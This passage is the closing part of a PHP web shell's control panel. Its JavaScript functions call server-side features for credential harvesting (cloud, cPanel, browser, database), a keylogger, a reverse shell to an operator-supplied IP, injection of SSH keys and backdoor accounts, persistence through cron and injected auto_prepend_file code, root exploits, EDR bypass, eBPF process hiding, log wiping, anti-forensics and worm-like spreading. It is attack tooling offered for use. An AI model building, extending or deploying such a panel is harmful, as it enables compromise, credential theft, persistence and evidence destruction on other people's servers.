                .catch(() => showToast('Failed to load file', 'error'));
        }

        function showRename(n){
            if(n){
                document.getElementById('newName').value = n;
                document.getElementById('renameTarget').value = n;
                showModal('renameModal');
            }
        }

        function showChmod(n,p){
            if(n){
                document.getElementById('permission').value = p;
                document.getElementById('chmodTarget').value = n;
                showModal('chmodModal');
            }
        }

        function apiCall(url, successMsg, errorMsg = 'Error') {
            showToast('Processing...', 'info');
            fetch(url)
                .then(r => {
                    if(!r.ok) throw new Error('Network error');
                    return r.json();
                })
                .then(d => {
                    if(d.status === 'success') {
                        showToast(successMsg, 'success');
                    } else {
                        showToast(d.message || errorMsg, 'error');
                    }
                })
                .catch(() => showToast(errorMsg, 'error'));
        }

        function runHideProcessEBPF() {
            var proc = prompt('Process name to hide:', '<?= basename(__FILE__) ?>');
            if (!proc) return;
            apiCall(`?hide_process_ebpf=1&process=${encodeURIComponent(proc)}`, 
                'eBPF process hider installed', 'eBPF process hider failed');
        }

        function runHideFileEBPF() {
            var file = prompt('File path to hide:', '');
            if (!file) return;
            apiCall(`?hide_file_ebpf=1&file=${encodeURIComponent(file)}`, 
                'eBPF file hider installed', 'eBPF file hider failed');
        }

        function runEDRBypass() {
            if(!confirm('EDR BYPASS ULTIMATE? (Tartarus + EDRSilencer)')) return;
            apiCall('?edr_bypass=1', 'EDR bypass complete', 'EDR bypass failed');
        }

        function runAutoRootModern() {
            if(!confirm('MODERN ROOT EXPLOIT? (CVE-2023-35001 + GameOver + Container Escape)')) return;
            apiCall('?auto_root_modern=1', 'Modern root exploit executed', 'Modern root exploit failed');
        }

        function runPersistenceAdvanced() {
            if(!confirm('ADVANCED PERSISTENCE? (Systemd + Fileless + Library Hijacking)')) return;
            apiCall('?persistence_advanced=1', 'Advanced persistence installed', 'Advanced persistence failed');
        }

        function runCredHarvest() {
            if(!confirm('CREDENTIAL HARVEST? (Browser + Cloud + Config)')) return;
            apiCall('?cred_harvest=1', 'Credentials harvested', 'Credential harvest failed');
        }

        function runSelfDestructAdvanced() {
            if(!confirm('SELF DESTRUCT? (Memory wipe + Log clean + File shred)')) return;
            if(!confirm('FINAL CONFIRMATION: This will destroy the shell!')) return;
            apiCall('?self_destruct_advanced=1', 'Self destruct executed', 'Self destruct failed');
        }

        function runWorm(){
            if(!confirm('Start multi-vector fileless worm? (SSH + Exploit + Supply Chain)')) return;
            apiCall('?worm=1', 'Multi-vector fileless worm executed', 'Worm failed');
        }

        function runWPScan() {
            if(!confirm('Scan for WordPress configs?')) return;
            apiCall('?wpscan=1', 'WP scan done', 'WP scan failed');
        }

        function runConfigFinder() {
            if(!confirm('Find sensitive files?')) return;
            apiCall('?configfinder=1', 'Config finder done', 'Config finder failed');
        }

        function runDumpDB() {
            if(!confirm('Dump database credentials?')) return;
            apiCall('?dumpdb=1', 'DB dump done', 'DB dump failed');
        }

        function runCpanelHarvest() {
            if(!confirm('Harvest cPanel credentials?')) return;
            apiCall('?cpanel_harvest=1', 'cPanel harvest done', 'Harvest failed');
        }

        function runCloudCreds() {
            if(!confirm('Grab cloud credentials (AWS/GCP/Azure)?')) return;
            apiCall('?cloud_creds=1', 'Cloud credentials grabbed', 'Cloud creds failed');
        }

        function runDbExplorer() {
            var type = prompt('Database type (mysql|postgresql|redis|mongodb|sqlite):', 'mysql');
            if(type) {
                var action = prompt('Action (list|tables|dump):', 'list');
                var db = prompt('Database name:', '');
                apiCall(`?db_explorer=1&type=${encodeURIComponent(type)}&action=${encodeURIComponent(action)}&db=${encodeURIComponent(db)}`, 
                    'DB Explorer done', 'DB Explorer failed');
            }
        }

        function runFirewallKiller() {
            if(!confirm('Kill firewall?')) return;
            apiCall('?firewall_killer=1', 'Firewall killed', 'Firewall kill failed');
        }

        function runNetworkPivot() {
            var action = prompt('Action (ssh_tunnel|ssh_dynamic|reverse_tunnel|status):', 'status');
            if(action === 'ssh_tunnel' || action === 'ssh_dynamic' || action === 'reverse_tunnel') {
                var target = prompt('Target (user@host):', '');
                var port = prompt('Port:', '');
                var local_port = prompt('Local port:', '');
                apiCall(`?network_pivot=1&action=${encodeURIComponent(action)}&target=${encodeURIComponent(target)}&port=${encodeURIComponent(port)}&local_port=${encodeURIComponent(local_port)}`, 
                    'Network pivot done', 'Network pivot failed');
            } else {
                apiCall(`?network_pivot=1&action=${encodeURIComponent(action)}`, 
                    'Network pivot done', 'Network pivot failed');
            }
        }

        function runKeylogger() {
            var action = prompt('Action (start|stop|read|clear):', 'start');
            if(action) {
                apiCall(`?keylogger=1&action=${encodeURIComponent(action)}`, 
                    'Keylogger done', 'Keylogger failed');
            }
        }

        function runReverseShell() {
            var action = prompt('Action (start|stop|status):', 'status');
            if(action === 'start') {
                var ip = prompt('IP address:', '');
                var port = prompt('Port:', '4444');
                if(ip && port) {
                    apiCall(`?reverseshell=1&action=${encodeURIComponent(action)}&ip=${encodeURIComponent(ip)}&port=${encodeURIComponent(port)}`, 
                        'Reverse shell started', 'Reverse shell failed');
                }
            } else {
                apiCall(`?reverseshell=1&action=${encodeURIComponent(action)}`, 
                    'Reverse shell done', 'Reverse shell failed');
            }
        }

        function runPortScan() {
            var target = prompt('Target IP/host:', 'localhost');
            var ports = prompt('Ports (comma separated):', '22,80,443,3306,5432,8080,8443');
            if(target && ports) {
                apiCall(`?port_scan=1&target=${encodeURIComponent(target)}&ports=${encodeURIComponent(ports)}`, 
                    'Port scan done', 'Port scan failed');
            }
        }

        function runCleanLogs() {
            if(!confirm('Clean logs aggressively (zero + shred)?')) return;
            apiCall('?clean_logs=1', 'Logs cleaned', 'Clean logs failed');
        }

        function runOneClick() {
            if(!confirm('ONE CLICK CLEANUP? (All traces + logs + history + temp)')) return;
            if(!confirm('FINAL CONFIRMATION: This will destroy all traces!')) return;
            apiCall('?one_click=1&confirm=yes', 'One click executed', 'One click failed');
        }

        function runSSHKeys() {
            apiCall('?sshkeys=1', 'SSH keys found', 'SSH keys failed');
        }

        function runSSHInject() {
            var key = prompt('Public key to inject:', 'ssh-rsa AAAAB3NzaC1yc2EAAA...');
            if(key) {
                apiCall(`?ssh_inject=1&key=${encodeURIComponent(key)}`, 
                    'SSH keys injected', 'SSH inject failed');
            }
        }

        function runCreateSSH() {
            var user = prompt('Username:', '');
            var pass = prompt('Password:', '');
            if(user && pass) {
                apiCall(`?create_ssh=1&user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`, 
                    'SSH user created', 'Create SSH failed');
            }
        }

        function runCreateRDP() {
            var user = prompt('Username:', 'Dkid03' + Math.floor(Math.random()*1000));
            if (!user) return;
            var pass = prompt('Password:', 'Dkid@pssw0rd123!');
            if (!pass) return;
            apiCall(`?create_rdp=1&user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`, 
                'RDP user created', 'Create RDP failed');
        }

        function runCreateFTP() {
            var u = prompt('Username:'); 
            if(u) {
                var p = prompt('Password:'); 
                var h = prompt('Home:','/home/'+u); 
                apiCall(`?create_ftp=1&user=${encodeURIComponent(u)}&pass=${encodeURIComponent(p||'')}&home=${encodeURIComponent(h)}`, 
                    'FTP account created', 'Create FTP failed');
            }
        }

        function runCreateMail() {
            var e = prompt('Email address:');
            if(e) {
                var p = prompt('Password:');
                if(p) {
                    var domain = e.split('@')[1] || window.location.hostname;
                    apiCall(`?create_mail=1&email=${encodeURIComponent(e)}&pass=${encodeURIComponent(p)}&domain=${encodeURIComponent(domain)}`, 
                        'Mail account created', 'Create mail failed');
                }
            }
        }

        function runInjectRestore() {
            if(!confirm('Inject restore code to index.php, wp-config.php, config.php, wp-load.php, settings.php?')) return;
            apiCall('?inject_restore=1', 'Injected successfully', 'Inject failed');
        }

        function runAutoPrepend() {
            if(!confirm('Inject auto_prepend_file to php.ini & .user.ini?')) return;
            apiCall('?auto_prepend=1', 'Auto prepend injected', 'Auto prepend failed');
        }

        function runBackup() {
            if(confirm('Backup this file?')) {
                apiCall('?backup=1', 'Backup created', 'Backup failed');
            }
        }

        function runDeleteBackup() {
            if(confirm('Delete all backup files?')) {
                if(confirm('Final confirmation!')) {
                    apiCall('?delete_backup=1&confirm=yes', 'Backup deleted', 'Delete failed');
                }
            }
        }

        function runCronPersistence() {
            var action = prompt('Action (install|remove|list):', 'list');
            var interval = prompt('Interval in minutes (for install):', '5');
            if(action) {
                apiCall(`?cron_persistence=1&action=${encodeURIComponent(action)}&interval=${encodeURIComponent(interval)}`, 
                    'Cron persistence done', 'Cron persistence failed');
            }
        }

        function runUserPersistence() {
            var action = prompt('Action (install|remove):', 'install');
            if(action) {
                apiCall(`?user_persistence=${encodeURIComponent(action)}`, 
                    action === 'install' ? 'User persistence installed' : 'User persistence removed', 
                    'User persistence failed');
            }
        }

        function runAntiForensic() {
            if(!confirm('Anti forensic?')) return;
            apiCall('?anti_forensic=1', 'Anti forensic done', 'Anti forensic failed');
        }

        function runCloneShell() {
            var targets = prompt('Target directories (comma separated, empty for auto):', '');
            if(targets !== null) {
                apiCall(`?clone_shell=1&targets=${encodeURIComponent(targets)}`, 
                    'Shell cloned', 'Clone shell failed');
            }
        }

        function runListSpread() {
            apiCall('?list_spread=1', 'List spread done', 'List spread failed');
        }

        window.onclick = function(e) {
            document.querySelectorAll('.modal').forEach(m => {
                if(e.target === m) hideModal(m.id);
            });
        }

        <?php if(isset($_GET['edit'])): ?>
        <?php 
        $file = $_GET['edit']; 
        $filePath = $currentPath . DIRECTORY_SEPARATOR . $file; 
        $content = (file_exists($filePath) && is_file($filePath) && isSafePath($filePath, $rootPath, $specialDirectories) && in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $editableExtensions)) ? @file_get_contents($filePath) : ''; 
        ?>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('fileContent').value = <?= json_encode($content) ?>;
            document.getElementById('editFileName').value = <?= json_encode($file) ?>;
            showModal('editModal');
        });
        <?php endif; ?>

        document.querySelector('a[href="?logout=1"]')?.addEventListener('click', function(e) {
            e.preventDefault();
            if(confirm('Logout?')) {
                window.location.href = '?logout=1';
            }
        });

        document.addEventListener('keydown', function(e) {
            if(e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(m => hideModal(m.id));
            }
            if(e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                const editModal = document.getElementById('editModal');
                if(editModal.classList.contains('active')) {
                    document.querySelector('#editModal form button[type="submit"]')?.click();
                }
            }
        });
    </script>
<?php endif; ?>
</body>
</html>
